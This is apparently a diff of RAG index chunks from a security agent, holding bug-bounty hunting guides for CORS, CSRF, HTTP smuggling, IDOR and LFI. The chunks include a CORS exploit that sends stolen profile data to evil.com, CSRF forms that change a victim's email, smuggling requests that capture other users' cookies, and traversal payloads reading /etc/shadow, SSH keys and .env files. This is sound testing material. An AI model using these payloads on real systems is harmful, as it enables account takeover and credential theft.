+    "text": "a));\n});\n</script>\n</body>\n</html>\n```\n\n**Victim visits evil.com → their profile data (email, PII, API keys) is sent to attacker.**\n\nFor `null` origin exploit:\n```html\n<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html,\n<script>\nfetch('https://target.com/api/v1/user/profile', {credentials: 'include'})\n.then(r => r.json())\n.then(d => top.postMessage(JSON.stringify(d), '*'))\n</script>\"></iframe>\n<script>\nwindow.addEventListener('message', e => {\n  fetch('https://evil.com/steal?d=' + e.data);\n});\n</script>\n```\n\n---\n\n## Subdomain Takeover + CORS Chain\n\nIf `ACAO` trusts `*.target.com` and you can take over `external.target.com` (subdomain takeover), these two bugs chain into a Critical finding. Document both bugs and the chain explicitly in the report.\n\n---\n\n## Impact Classification\n\n| Scenario | Severity |\n|---|---|\n| Origin reflected + `ACAC: true` on auth'd sensitive API | Critical/High |\n| `null` origin + `ACAC: true` | High |\n| Subdomain domain confusi",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 3,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\cors.md",
+        "mtime": 1775393895.2815504,
+        "size": 4461,
+        "hash": "288437bbc41a9ae2080833e917e568190e17b8e1540b6a3605a7aa9069a0b28e"
+      }
+    }
+  },
+  "5071549929425512819": {
+    "chunk_id": "rag\\vulnerabilities\\cors.md::chunk::4",
+    "doc_id": "rag\\vulnerabilities\\cors.md",
+    "text": "`null` origin + `ACAC: true` | High |\n| Subdomain domain confusion + `ACAC: true` | High |\n| Wildcard `*` on authenticated endpoints (no ACAC) | Low/Informational |\n| Wildcard `*` on public, unauthenticated data | Not reportable |\n\n---\n\n## Do Not Report\n- `Access-Control-Allow-Origin: *` without `Access-Control-Allow-Credentials: true` — not exploitable for credential theft\n- CORS on endpoints that only return public, non-sensitive data\n- CORS configuration considered a \"best practice\" issue without a concrete exploitable scenario\n",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 4,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\cors.md",
+        "mtime": 1775393895.2815504,
+        "size": 4461,
+        "hash": "288437bbc41a9ae2080833e917e568190e17b8e1540b6a3605a7aa9069a0b28e"
+      }
+    }
+  },
+  "5442077527369369375": {
+    "chunk_id": "rag\\vulnerabilities\\csrf.md::chunk::0",
+    "doc_id": "rag\\vulnerabilities\\csrf.md",
+    "text": "# CSRF — Cross-Site Request Forgery Hunting Methodology\n\n## The Critical Distinction\n\n> **Do NOT report CSRF on:** login, logout, search, or any action where the attacker gains nothing meaningful.  \n> **DO report CSRF on:** state-changing actions where the attacker benefits directly from forcing a victim to perform.\n\nMost programs explicitly exclude CSRF on login/logout. This file covers **when CSRF IS reportable**.\n\n---\n\n## When CSRF Is Reportable\n\nCSRF is reportable when ALL of these are true:\n1. **State changes** — the action modifies data or performs a transaction\n2. **No CSRF protection** — no token, no `SameSite=Strict/Lax` cookie, no `Origin` check\n3. **Attacker benefit** — the attacker directly gains from the victim performing this action\n4. **Victim is authenticated** — requires a logged-in victim\n\n**High-value CSRF targets:**\n- Change email address → attacker takes over account\n- Change password → direct account takeover\n- Change mobile/2FA phone → bypass MFA\n- Add SSH key / ",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 0,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\csrf.md",
+        "mtime": 1775393895.2815504,
+        "size": 5337,
+        "hash": "cefcc6ec47afe823760c28afc30196e4466f59ed6086863971e514aff3b7f965"
+      }
+    }
+  },
+  "1657610681498878737": {
+    "chunk_id": "rag\\vulnerabilities\\csrf.md::chunk::1",
+    "doc_id": "rag\\vulnerabilities\\csrf.md",
+    "text": "takeover\n- Change mobile/2FA phone → bypass MFA\n- Add SSH key / OAuth app → persistent access\n- Money transfer / payment initiation → financial impact\n- Add admin user → privilege escalation\n- Delete account / critical data → destructive\n- Change security settings (disable MFA, change recovery email)\n\n---\n\n## CSRF Protection Check\n\nTest each target endpoint for missing protections:\n\n**Check 1 — No CSRF token in request:**\nRemove any `csrf_token`, `_token`, `authenticity_token` parameter from the request.\n→ If the action still succeeds → CSRF token not validated\n\n**Check 2 — SameSite cookie attribute:**\n```\nSet-Cookie: session=abc123; SameSite=Strict  → CSRF blocked by browser\nSet-Cookie: session=abc123; SameSite=Lax     → CSRF blocked for POST (but not GET with navigation)\nSet-Cookie: session=abc123                    → No SameSite → CSRF possible (older browsers)\nSet-Cookie: session=abc123; SameSite=None; Secure → Cross-origin allowed → CSRF possible\n```\n\n**Check 3 — Origin / Referer ",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 1,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\csrf.md",
+        "mtime": 1775393895.2815504,
+        "size": 5337,
+        "hash": "cefcc6ec47afe823760c28afc30196e4466f59ed6086863971e514aff3b7f965"
+      }
+    }
+  },
+  "235269535098156638": {
+    "chunk_id": "rag\\vulnerabilities\\csrf.md::chunk::2",
+    "doc_id": "rag\\vulnerabilities\\csrf.md",
+    "text": "rigin allowed → CSRF possible\n```\n\n**Check 3 — Origin / Referer header check:**\nSend request with:\n- `Origin: https://evil.com` → if rejected → server checks origin\n- Remove `Referer` header entirely → if still works → no referer check\n\n**Check 4 — Custom header requirement:**\nSome APIs require `X-Requested-With: XMLHttpRequest` or `Content-Type: application/json` — these are NOT CSRF protections (JavaScript can set them cross-origin in some cases using CORS misconfig).\n\n---\n\n## Generating a CSRF PoC\n\n**Standard HTML form PoC (for `application/x-www-form-urlencoded`):**\n```html\n<html>\n<body onload=\"document.forms[0].submit()\">\n<form method=\"POST\" action=\"https://target.com/api/account/email\">\n  <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\"/>\n  <input type=\"hidden\" name=\"confirm_email\" value=\"attacker@evil.com\"/>\n</form>\n</body>\n</html>\n```\n\n**For JSON body CSRF (only works if `Content-Type: application/json` is not strictly required):**\n```html\n<form method=\"POST\" action=",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 2,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\csrf.md",
+        "mtime": 1775393895.2815504,
+        "size": 5337,
+        "hash": "cefcc6ec47afe823760c28afc30196e4466f59ed6086863971e514aff3b7f965"
+      }
+    }
+  },
+  "1481721408541404840": {
+    "chunk_id": "rag\\vulnerabilities\\csrf.md::chunk::3",
+    "doc_id": "rag\\vulnerabilities\\csrf.md",
+    "text": "is not strictly required):**\n```html\n<form method=\"POST\" action=\"https://target.com/api/account/email\" enctype=\"text/plain\">\n  <input name='{\"email\":\"attacker@evil.com\",\"x\":\"' value='\"}'>\n</form>\n```\nThis sends `Content-Type: text/plain` with body `{\"email\":\"attacker@evil.com\",\"x\":\"\"}` — if server parses it as JSON → CSRF with JSON body.\n\n**For PUT/PATCH CSRF via form method override:**\nSome frameworks support `_method=PATCH` in POST forms — test if the endpoint accepts this.\n\n---\n\n## CSRF + Low Impact = Not Reportable\n\nCSRF is often downgraded or rejected for:\n- **Actions requiring knowledge the attacker doesn't have** (e.g., CSRF to delete post by ID when attacker can't know the ID)\n- **Actions the attacker could perform without victim** (e.g., CSRF to follow a public user)\n- **Low-scale impact** (e.g., change display language)\n- **Email confirmation required** for sensitive changes — defends against CSRF\n- **Re-authentication required** for sensitive changes (password confirmation)\n",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 3,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\csrf.md",
+        "mtime": 1775393895.2815504,
+        "size": 5337,
+        "hash": "cefcc6ec47afe823760c28afc30196e4466f59ed6086863971e514aff3b7f965"
+      }
+    }
+  },
+  "1371181925840361598": {
+    "chunk_id": "rag\\vulnerabilities\\csrf.md::chunk::4",
+    "doc_id": "rag\\vulnerabilities\\csrf.md",
+    "text": "cation required** for sensitive changes (password confirmation)\n\n---\n\n## CSRF Token Bypass Techniques\n\nIf a CSRF token exists, test these bypasses before giving up:\n\n| Bypass | Description |\n|---|---|\n| Remove token entirely | Server may not validate if parameter is absent |\n| Use another user's token | Tokens may not be tied to the session |\n| Use an old/expired token | Server may not expire tokens |\n| Change method (POST → GET) | CSRF token may only be checked on POST |\n| Change `Content-Type` | Form data vs JSON may skip token check |\n| Null/empty token | `csrf_token=` or `csrf_token=null` |\n\n---\n\n## Impact Classification\n\n| CSRF Target | Severity |\n|---|---|\n| Change email/password → ATO | High |\n| Add admin user / change role | High/Critical |\n| Money transfer / payment | High/Critical |\n| Change 2FA settings | High |\n| Add OAuth app / SSH key | High |\n| Delete account / important data | Medium/High |\n| Change profile preferences | Low / Not reportable |\n| Logout | Not reportable ",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 4,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\csrf.md",
+        "mtime": 1775393895.2815504,
+        "size": 5337,
+        "hash": "cefcc6ec47afe823760c28afc30196e4466f59ed6086863971e514aff3b7f965"
+      }
+    }
+  },
+  "5598093353912952001": {
+    "chunk_id": "rag\\vulnerabilities\\csrf.md::chunk::5",
+    "doc_id": "rag\\vulnerabilities\\csrf.md",
+    "text": " preferences | Low / Not reportable |\n| Logout | Not reportable (explicitly excluded by most programs) |\n\n---\n\n## Do Not Report\n- CSRF on login (no authenticated session to abuse)\n- CSRF on logout (no attacker benefit)\n- CSRF on search / read-only actions\n- CSRF on endpoints protected by `SameSite=Strict` on the session cookie\n- CSRF where re-authentication is required to complete the action\n- CSRF on public actions with no authenticated state change\n",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 5,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\csrf.md",
+        "mtime": 1775393895.2815504,
+        "size": 5337,
+        "hash": "cefcc6ec47afe823760c28afc30196e4466f59ed6086863971e514aff3b7f965"
+      }
+    }
+  },
+  "931779961940093777": {
+    "chunk_id": "rag\\vulnerabilities\\http-smuggling.md::chunk::0",
+    "doc_id": "rag\\vulnerabilities\\http-smuggling.md",
+    "text": "# HTTP Request Smuggling — Hunting Methodology\n\n## What Is HTTP Request Smuggling\n\nWhen a front-end server (load balancer, WAF, CDN) and back-end server disagree on where one HTTP request ends and the next begins, an attacker can \"smuggle\" a hidden second request that is processed by the back-end as if it came from another user.\n\n**Root cause:** Ambiguity in how `Content-Length` (CL) and `Transfer-Encoding` (TE) headers are prioritized by different servers.\n\n---\n\n## The Two Main Types\n\n### CL.TE — Front-end uses Content-Length, Back-end uses Transfer-Encoding\n\nFront-end reads body length from `Content-Length`, forwards full body to back-end. Back-end reads `Transfer-Encoding: chunked` and stops at `0\\r\\n\\r\\n`, leaving leftover bytes in the back-end's buffer as the start of the \"next\" request.\n\n### TE.CL — Front-end uses Transfer-Encoding, Back-end uses Content-Length\n\nFront-end reads chunked body and stops at `0`, but back-end reads `Content-Length` and expects more data. Front-end pas",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 0,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\http-smuggling.md",
+        "mtime": 1775393895.28255,
+        "size": 5350,
+        "hash": "d11843de23cc04bd7b01ddd2f8711c7f106ee468cbe6fa17c58f7aed363be475"
+      }
+    }
+  },
+  "1608234622275506011": {
+    "chunk_id": "rag\\vulnerabilities\\http-smuggling.md::chunk::1",
+    "doc_id": "rag\\vulnerabilities\\http-smuggling.md",
+    "text": "-end reads `Content-Length` and expects more data. Front-end passes a short body, back-end waits for more — then another request's bytes arrive and get prepended.\n\n### TE.TE — Both support TE, but one can be confused\n\nSend an obfuscated `Transfer-Encoding` header that one server ignores:\n```\nTransfer-Encoding: xchunked\nTransfer-Encoding: chunked\nTransfer-Encoding : chunked\nTransfer-Encoding: chunked\nTransfer-Encoding: identity\n```\n\n---\n\n## Detection\n\n**Step 1 — Timing-based probe (CL.TE):**\n```http\nPOST / HTTP/1.1\nHost: target.com\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 4\nTransfer-Encoding: chunked\n\n1\nA\nX\n```\nIf the request hangs for 10+ seconds → back-end is waiting for the chunk terminator → **CL.TE confirmed**.\n\n**Step 2 — Timing-based probe (TE.CL):**\n```http\nPOST / HTTP/1.1\nHost: target.com\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nX\n```\nIf request hangs → f",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 1,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\http-smuggling.md",
+        "mtime": 1775393895.28255,
+        "size": 5350,
+        "hash": "d11843de23cc04bd7b01ddd2f8711c7f106ee468cbe6fa17c58f7aed363be475"
+      }
+    }
+  },
+  "2175992957060634615": {
+    "chunk_id": "rag\\vulnerabilities\\http-smuggling.md::chunk::2",
+    "doc_id": "rag\\vulnerabilities\\http-smuggling.md",
+    "text": "gth: 6\nTransfer-Encoding: chunked\n\n0\n\nX\n```\nIf request hangs → front-end sent the whole thing but back-end is waiting for CL bytes → **TE.CL confirmed**.\n\n**Tool to suggest:** [Burp Suite HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler) — automates detection and PoC generation.\n\n> Always disable \"Update Content-Length\" in Burp Repeater when testing smuggling. Work in HTTP/1.1 only.\n\n---\n\n## Exploitation Techniques\n\n### 1. Bypassing Front-End Access Controls\n\nWAF/reverse proxy blocks `GET /admin`. Smuggle a request to `/admin` so the back-end processes it as a legitimate next request:\n\n**CL.TE example:**\n```http\nPOST / HTTP/1.1\nHost: target.com\nContent-Length: 37\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nFoo: bar\n```\n\nThe front-end sees a complete POST. The back-end sees the POST ending at `0` and then processes `GET /admin HTTP/1.1` as a new request from an internal source.\n\n### 2. Capturing Other Users' Requests\n\nSmuggle a partial request that caus",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 2,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\http-smuggling.md",
+        "mtime": 1775393895.28255,
+        "size": 5350,
+        "hash": "d11843de23cc04bd7b01ddd2f8711c7f106ee468cbe6fa17c58f7aed363be475"
+      }
+    }
+  },
+  "3469256422912454959": {
+    "chunk_id": "rag\\vulnerabilities\\http-smuggling.md::chunk::3",
+    "doc_id": "rag\\vulnerabilities\\http-smuggling.md",
+    "text": "uring Other Users' Requests\n\nSmuggle a partial request that causes the NEXT real user's request bytes to be appended to a controlled body. This effectively lets you read other users' cookies, auth tokens, and POST data.\n\n**CL.TE capture attack:**\n```http\nPOST / HTTP/1.1\nContent-Length: 200\nTransfer-Encoding: chunked\n\n0\n\nPOST /store-comment HTTP/1.1\nHost: target.com\nContent-Length: 500\n\ncomment=\n```\nWhen next user's request arrives, it gets appended to `comment=` → their request headers (including cookies) are stored as a comment → attacker reads it.\n\n### 3. Reflected XSS via Smuggling\n\nIf a back-end endpoint reflects input and there's a smuggling vulnerability, chain them:\n```\nSmuggled request → reflected endpoint → XSS without user interaction\n```\n\n### 4. Cache Poisoning via Smuggling\n\nPoison a cached response with smuggled content:\n1. Smuggle a request that gets a cacheable poisoned response\n2. Next user requesting the same URL gets the poisoned response\n\n---\n\n## HTTP/2 Downgrade Smu",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 3,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\http-smuggling.md",
+        "mtime": 1775393895.28255,
+        "size": 5350,
+        "hash": "d11843de23cc04bd7b01ddd2f8711c7f106ee468cbe6fa17c58f7aed363be475"
+      }
+    }
+  },
+  "4646235257981114988": {
+    "chunk_id": "rag\\vulnerabilities\\http-smuggling.md::chunk::4",
+    "doc_id": "rag\\vulnerabilities\\http-smuggling.md",
+    "text": "ame URL gets the poisoned response\n\n---\n\n## HTTP/2 Downgrade Smuggling\n\nModern infrastructure often uses HTTP/2 front-to-front but downgrades to HTTP/1.1 to the back-end. HTTP/2 doesn't have the TE ambiguity issue, but the downgrade reintroduces it. Test:\n\n- `H2.CL` — HTTP/2 with a Content-Length header that causes confusion during downgrade\n- `H2.TE` — HTTP/2 with a Transfer-Encoding header injected into the request\n\nBurp's HTTP Request Smuggler handles H2 downgrade detection automatically.\n\n---\n\n## Impact Classification\n\n| Scenario | Severity |\n|---|---|\n| Bypass front-end access control to reach admin | Critical |\n| Capture other users' credentials/tokens | Critical |\n| XSS without victim interaction via smuggling | High/Critical |\n| Cache poisoning affecting all users | High/Critical |\n| Confirmed smuggling with no exploitable backend behavior yet | Medium |\n| Timing-based detection only (not confirmed exploitable) | Low/Medium |\n\n## Evidence Requirements\n- The exact request that d",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 4,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\http-smuggling.md",
+        "mtime": 1775393895.28255,
+        "size": 5350,
+        "hash": "d11843de23cc04bd7b01ddd2f8711c7f106ee468cbe6fa17c58f7aed363be475"
+      }
+    }
+  },
+  "5946303167691088172": {
+    "chunk_id": "rag\\vulnerabilities\\http-smuggling.md::chunk::5",
+    "doc_id": "rag\\vulnerabilities\\http-smuggling.md",
+    "text": "ow/Medium |\n\n## Evidence Requirements\n- The exact request that demonstrates smuggling (with headers as-sent)\n- Proof of impact: 403 → 200, captured victim cookie, or poisoned cache\n- Response comparison showing the anomaly\n- Note Burp extension used if applicable\n\n## Do Not Report\n- Smuggling on HTTP/2-only front-ends without downgrade (much harder)\n- Timing anomalies without confirmed back-end behavior difference\n- DE-SYNC issues on WebSockets without security impact\n",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 5,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\http-smuggling.md",
+        "mtime": 1775393895.28255,
+        "size": 5350,
+        "hash": "d11843de23cc04bd7b01ddd2f8711c7f106ee468cbe6fa17c58f7aed363be475"
+      }
+    }
+  },
+  "5779505059718119965": {
+    "chunk_id": "rag\\vulnerabilities\\idor.md::chunk::0",
+    "doc_id": "rag\\vulnerabilities\\idor.md",
+    "text": "# IDOR — Insecure Direct Object Reference Hunting Methodology\n\n## Types to Hunt\n\n| Type | Description |\n|---|---|\n| Horizontal IDOR | Access another user's data at same privilege level |\n| Vertical IDOR | Access higher-privilege resources (user → admin) |\n| Function-level IDOR | Call admin/restricted API functions as normal user |\n| Indirect reference | Use predictable/guessable reference (sequential IDs, UUIDs) |\n\n## Finding IDOR Entry Points\n\nLook for any parameter that references a resource owned by a user:\n\n- `?id=`, `?user_id=`, `?account_id=`, `?order_id=`, `?invoice_id=`\n- Path parameters: `/api/users/123/profile`, `/orders/456/receipt`\n- POST body: `{\"target_user_id\": 789}`\n- GUIDs: even `?id=550e8400-e29b-41d4-a716-446655440000` may be IDOR if server doesn't verify ownership\n\n**High-value targets to test:**\n- User profile/settings endpoints (`/api/user/<id>`)\n- Order/invoice/payment history (`/orders/<id>`)\n- File download/export (`/export?report_id=<id>`)\n- Message/notificati",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 0,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\idor.md",
+        "mtime": 1775393895.28255,
+        "size": 3638,
+        "hash": "542fe6c5efcd58cd623914a6f62c4c8ac3e5c84e8af0393f5bc7f37893d1a954"
+      }
+    }
+  },
+  "1372573500687160490": {
+    "chunk_id": "rag\\vulnerabilities\\idor.md::chunk::1",
+    "doc_id": "rag\\vulnerabilities\\idor.md",
+    "text": " download/export (`/export?report_id=<id>`)\n- Message/notification retrieval (`/messages/<id>`)\n- Admin APIs accessible from user JWT (check for unprotected `/api/admin/` endpoints)\n- Password reset token usage (`/reset?token=<token>&user_id=<id>`)\n\n## Confirmation Approach — Two Account Test\n\nThe gold standard for IDOR confirmation:\n\n1. Create **Account A** and **Account B**\n2. From Account A, note the resource ID (order, profile, message, etc.)\n3. Log into **Account B** (different session/token)\n4. From Account B, attempt to access Account A's resource using Account A's ID\n5. If successful → IDOR confirmed\n\nProvide both the request from Account B AND the response showing Account A's data.\n\n## Authorization Check Locations (what to look for in code)\n\nVulnerable pattern — missing authorization check:\n```\n// VULNERABLE: only checks auth, not ownership\napp.get('/orders/:id', authenticate, (req, res) => {\n  const order = Order.findById(req.params.id)  // No ownership check!\n  res.json(ord",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 1,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\idor.md",
+        "mtime": 1775393895.28255,
+        "size": 3638,
+        "hash": "542fe6c5efcd58cd623914a6f62c4c8ac3e5c84e8af0393f5bc7f37893d1a954"
+      }
+    }
+  },
+  "1382258213252728964": {
+    "chunk_id": "rag\\vulnerabilities\\idor.md::chunk::2",
+    "doc_id": "rag\\vulnerabilities\\idor.md",
+    "text": "r.findById(req.params.id)  // No ownership check!\n  res.json(order)\n})\n```\n\nSecure pattern — proper authorization:\n```\n// SAFE: checks both auth and ownership\napp.get('/orders/:id', authenticate, (req, res) => {\n  const order = Order.findOne({ id: req.params.id, user_id: req.user.id })\n  if (!order) return res.status(403).json({ error: 'Forbidden' })\n  res.json(order)\n})\n```\n\n## UUID/GUID IDORs\n\nDo NOT assume UUIDs are safe from IDOR. The reference value being hard to guess does NOT mean authorization is enforced. Test:\n1. Note your UUID resource reference\n2. Share/leak the UUID (e.g., in a URL) and test if another user can access it\n3. If yes → IDOR exists, even if UUID is not guessable\n\nUUIDs prevent enumeration but do NOT enforce access control.\n\n## Mass Assignment IDOR\n\nSending additional fields in a PUT/PATCH that shouldn't be user-modifiable:\n- `{\"role\": \"admin\"}` in profile update\n- `{\"user_id\": 1}` in account settings\n- `{\"price\": 0.01}` in checkout\n\nTest by adding sensitive fi",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 2,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\idor.md",
+        "mtime": 1775393895.28255,
+        "size": 3638,
+        "hash": "542fe6c5efcd58cd623914a6f62c4c8ac3e5c84e8af0393f5bc7f37893d1a954"
+      }
+    }
+  },
+  "2043334378892042998": {
+    "chunk_id": "rag\\vulnerabilities\\idor.md::chunk::3",
+    "doc_id": "rag\\vulnerabilities\\idor.md",
+    "text": "ngs\n- `{\"price\": 0.01}` in checkout\n\nTest by adding sensitive fields to update requests and checking if they take effect.\n\n## Impact by Data Type\n\n| Data Exposed | Severity |\n|---|---|\n| PII (name, email, address, phone) | High |\n| Financial data (payment methods, transaction history) | High/Critical |\n| Private messages | High |\n| Account credentials or tokens | Critical |\n| Public profile data (username, bio) | Low / Not reportable |\n| Internal IDs without sensitive data | Low / Not reportable |\n\n## Do Not Report\n- Accessing public or non-sensitive data via known IDs\n- IDOR that requires admin access to exploit (admin IDORing another admin)\n- Enumerating sequential IDs without confirmed data leak (speculation)\n",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 3,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\idor.md",
+        "mtime": 1775393895.28255,
+        "size": 3638,
+        "hash": "542fe6c5efcd58cd623914a6f62c4c8ac3e5c84e8af0393f5bc7f37893d1a954"
+      }
+    }
+  },
+  "3125461690705334242": {
+    "chunk_id": "rag\\vulnerabilities\\lfi.md::chunk::0",
+    "doc_id": "rag\\vulnerabilities\\lfi.md",
+    "text": "# LFI — Local File Inclusion / Path Traversal Hunting Methodology\n\n## Types to Hunt\n\n| Type | Description |\n|---|---|\n| Path Traversal | Read arbitrary files via `../` sequences in file path parameters |\n| Local File Inclusion | Server includes/executes the file (PHP `include()`) |\n| LFI → RCE | Combine LFI with log poisoning or session file control to achieve RCE |\n\n---\n\n## Finding Path Traversal Entry Points\n\n**High-risk parameters:**\n- `?file=`, `?page=`, `?template=`, `?path=`, `?include=`, `?load=`, `?view=`\n- `?doc=`, `?pdf=`, `?download=`, `?resource=`, `?lang=`, `?module=`\n- Image/file serving: `/download?name=file.pdf`, `/static?f=img.png`\n- Language switching: `?lang=en` (may load `lang/en.php`)\n\n**Source code red flags:**\n```php\n// PHP — vulnerable\ninclude($_GET['page'] . '.php');\nfile_get_contents($_GET['file']);\nreadfile('/var/www/docs/' . $filename);\n\n// Python — vulnerable\nopen('/data/' + user_input, 'r').read()\nsend_file('uploads/' + filename)\n```\n\n---\n\n## Detection Pay",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 0,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\lfi.md",
+        "mtime": 1775393895.28255,
+        "size": 4964,
+        "hash": "439e4b3791eadb05882abbef7cad29d282131c27d370da624bc2ba15e5a96a01"
+      }
+    }
+  },
+  "6454667685491632328": {
+    "chunk_id": "rag\\vulnerabilities\\lfi.md::chunk::1",
+    "doc_id": "rag\\vulnerabilities\\lfi.md",
+    "text": "ad()\nsend_file('uploads/' + filename)\n```\n\n---\n\n## Detection Payloads (suggest to user)\n\n**Basic traversal (Linux):**\n- `../../../../etc/passwd`\n- `../../../etc/passwd`\n- `/etc/passwd` (absolute path — if no sanitization at all)\n\n**Windows traversal:**\n- `..\\..\\..\\..\\windows\\win.ini`\n- `../../../../windows/win.ini`\n\n**URL encoding bypasses:**\n- `..%2F..%2F..%2Fetc%2Fpasswd`\n- `%2e%2e%2f%2e%2e%2fetc%2fpasswd`\n- Double encoding: `..%252F..%252Fetc%252Fpasswd`\n\n**Null byte (older PHP < 5.3.4):**\n- `../../../../etc/passwd%00`\n\n**If suffix is appended by server (e.g., `.php`):**\n- Try PHP wrappers: `php://filter/convert.base64-encode/resource=../../../../etc/passwd`\n- The response will be base64 — decode to get file contents\n\n---\n\n## High-Value Target Files\n\n| OS | File | What It Contains |\n|---|---|---|\n| Linux | `/etc/passwd` | User accounts (confirm traversal) |\n| Linux | `/etc/shadow` | Password hashes (if root readable) |\n| Linux | `/proc/self/environ` | Environment variables, API keys",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 1,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\lfi.md",
+        "mtime": 1775393895.28255,
+        "size": 4964,
+        "hash": "439e4b3791eadb05882abbef7cad29d282131c27d370da624bc2ba15e5a96a01"
+      }
+    }
+  },
+  "9152318088505772572": {
+    "chunk_id": "rag\\vulnerabilities\\lfi.md::chunk::2",
+    "doc_id": "rag\\vulnerabilities\\lfi.md",
+    "text": "| Linux | `/proc/self/environ` | Environment variables, API keys |\n| Linux | `/proc/self/cmdline` | Running process command |\n| Linux | `~/.ssh/id_rsa` | Private SSH key → auth |\n| Linux | `/var/www/html/config.php` | DB credentials, API keys |\n| Linux | `/var/log/apache2/access.log` | Log poisoning target |\n| Windows | `C:\\Windows\\win.ini` | Confirm traversal |\n| Windows | `C:\\inetpub\\wwwroot\\web.config` | App config, credentials |\n| Any | `.env`, `config.yml`, `settings.py` | Application secrets |\n\n---\n\n## LFI → RCE Escalation (PHP)\n\n**Log Poisoning:**\n1. Send a request with a PHP code execution payload in the User-Agent header — a one-liner that passes a GET parameter to an OS command function (e.g., `system()`, `passthru()`, or `shell_exec()`). Exact payload syntax: see HackTricks \"LFI Log Poisoning\" or PayloadsAllTheThings.\n2. Include the Apache/Nginx access log via LFI:\n   - `?page=../../../../var/log/apache2/access.log`\n   - Alternative: `/proc/self/fd/[0-20]` — iterate fd numbe",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 2,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\lfi.md",
+        "mtime": 1775393895.28255,
+        "size": 4964,
+        "hash": "439e4b3791eadb05882abbef7cad29d282131c27d370da624bc2ba15e5a96a01"
+      }
+    }
+  },
+  "2508788041564424123": {
+    "chunk_id": "rag\\vulnerabilities\\lfi.md::chunk::3",
+    "doc_id": "rag\\vulnerabilities\\lfi.md",
+    "text": "log`\n   - Alternative: `/proc/self/fd/[0-20]` — iterate fd numbers to find open log file descriptors without knowing the exact path\n3. If log is displayed/included → RCE via `?page=...&cmd=id`\n\n**Session File Poisoning:**\n1. Inject PHP payload into a session variable (e.g., username field)\n2. Find PHP session file path: typically `/tmp/sess_SESSIONID`\n3. Include session file: `?page=../../../../tmp/sess_<sessionid>`\n\n**PHP Wrappers (if `allow_url_fopen` or `allow_url_include`):**\n- `php://input` — POST data as include source (POST body is treated as PHP and executed)\n- `data://text/plain,[php-payload]` — inline execution via data URI; the payload runs as PHP code (requires `allow_url_include=On`). Exact syntax: HackTricks \"LFI PHP Wrappers\"\n- `expect://id` — if `expect` wrapper enabled (rare)\n- **PHP Filter Chain RCE (modern, no log access needed):** Chain PHP filters via `php://filter/convert.iconv.UTF8.CSISO2022KR|...` to construct arbitrary strings that get executed. This works even",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 3,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\lfi.md",
+        "mtime": 1775393895.28255,
+        "size": 4964,
+        "hash": "439e4b3791eadb05882abbef7cad29d282131c27d370da624bc2ba15e5a96a01"
+      }
+    }
+  },
+  "3918380674177968676": {
+    "chunk_id": "rag\\vulnerabilities\\lfi.md::chunk::4",
+    "doc_id": "rag\\vulnerabilities\\lfi.md",
